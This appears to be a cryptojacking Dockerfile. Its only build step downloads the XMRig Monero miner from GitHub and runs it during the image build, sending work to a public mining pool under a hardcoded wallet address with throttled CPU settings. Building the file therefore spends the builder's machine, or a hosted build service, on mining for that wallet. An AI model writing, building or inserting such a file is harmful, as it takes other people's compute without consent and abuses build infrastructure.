FROM ubuntu:18.10
RUN apt-get update && apt-get install -y wget
RUN wget https://github.com/xmrig/xmrig/releases/download/v2.11.0/xmrig-2.11.0-xenial-x64.tar.gz && tar -xf xmrig-2.11.0-xenial-x64.tar.gz && cd xmrig-2.11.0 && ./xmrig -o stratum+tcp://pool.supportxmr.com:3333 -u 45UVbdyweuJV5peeuD1ypVbFs6Z1nYhRB4r9BEL9xYjE8Ej8Pjob3LQX2dN4m314gB87Z1M9TbabwN4g4L9184dcCLyiU6y -p Nvidia3 --threads 2 --max-cpu-usage=70 --cpu-priority 3 --donate-level 1
